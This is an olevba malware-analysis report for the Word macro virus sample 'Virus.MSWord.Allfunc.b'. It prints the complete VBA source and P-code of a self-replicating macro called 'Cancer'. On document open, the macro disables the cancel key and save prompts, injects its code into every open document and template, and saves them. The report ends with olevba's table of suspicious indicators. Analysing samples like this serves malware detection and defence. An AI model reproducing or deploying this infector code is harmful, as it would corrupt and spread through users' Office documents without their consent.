olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function Cancer()
Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set TD = ThisDocument.VBProject.VBComponents
For FindCode = 1 To TD.Count
If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function Cancer()" Then
MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 40)
End If
Next
End If
Next
For MainLoop = 1 To 2
If MainLoop = 1 Then Set Target = Documents Else Set Target = Templates
For TargetCount = 1 To Target.Count
Set TargetComponents = Target(TargetCount).VBProject.VBComponents
For ModuleCount = 1 To TargetComponents.Count
Function_Exist = False
TargetCodeChanged = False
For TargetLines = 1 To TargetComponents(ModuleCount).CodeModule.CountOfLines
If TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) = "Private Function Cancer()" Then Function_Exist = True
If Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 12) = "Private Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
TargetCodeChanged = True
ElseIf Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 4) = "Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
TargetCodeChanged = True
End If
Next
If Function_Exist = False Then TargetComponents(ModuleCount).CodeModule.AddFromString MyCode
If Function_Exits = False Or TargetCodeChanged = True Then
If MainLoop = 1 Then Documents(TargetCount).SaveAs FileName:=Documents(TargetCount).FullName
If MainLoop = 2 Then Templates(TargetCount).Save
End If
Next
Next
Next
End Function
Private Sub Document_Open(): Cancer
'My_Creator = Lys Kovick
'My_Name = Cancer
'My_Comments = Devil|liveD - God|doG
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Allfunc.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5913 bytes
' Line #0:
' 	FuncDefn (Private Function Cancer(id_FFFE As Variant))
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	SetStmt 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TD 
' Line #5:
' 	StartForVariable 
' 	Ld FindCode 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TD 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld CodeLines 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #8:
' 	Ld CodeLines 
' 	LitDI2 0x0001 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0019 "Private Function Cancer()"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	Ld CodeLines 
' 	LitDI2 0x0028 
' 	Ld FindCode 
' 	Ld TD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCode 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Next 
' Line #14:
' 	StartForVariable 
' 	Ld MainLoop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #15:
' 	Ld MainLoop 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Documents 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Templates 
' 	Set Target 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld TargetCount 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd Count 
' 	For 
' Line #17:
' 	SetStmt 
' 	Ld TargetCount 
' 	ArgsLd Target 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set TargetComponents 
' Line #18:
' 	StartForVariable 
' 	Ld ModuleCount 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetComponents 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitVarSpecial (False)
' 	St Function_Exist 
' Line #20:
' 	LitVarSpecial (False)
' 	St TargetCodeChanged 
' Line #21:
' 	StartForVariable 
' 	Ld TargetLines 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #22:
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0019 "Private Function Cancer()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Function_Exist 
' 	EndIf 
' Line #23:
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000C 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000C "Private Sub "
' 	Eq 
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0008 ": Cancer"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld TargetLines 
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 ": Cancer"
' 	Concat 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #25:
' 	LitVarSpecial (True)
' 	St TargetCodeChanged 
' Line #26:
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "Sub "
' 	Eq 
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0008 ": Cancer"
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #27:
' 	Ld TargetLines 
' 	Ld TargetLines 
' 	LitDI2 0x0001 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 ": Cancer"
' 	Concat 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #28:
' 	LitVarSpecial (True)
' 	St TargetCodeChanged 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	Ld Function_Exist 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld MyCode 
' 	Ld ModuleCount 
' 	ArgsLd TargetComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #32:
' 	Ld Function_Exits 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld TargetCodeChanged 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #33:
' 	Ld MainLoop 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TargetCount 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld TargetCount 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #34:
' 	Ld MainLoop 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TargetCount 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	EndFunc 
' Line #40:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall Cancer 0x0000 
' Line #41:
' 	QuoteRem 0x0000 0x0017 "My_Creator = Lys Kovick"
' Line #42:
' 	QuoteRem 0x0000 0x0010 "My_Name = Cancer"
' Line #43:
' 	QuoteRem 0x0000 0x0023 "My_Comments = Devil|liveD - God|doG"
' Line #44:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

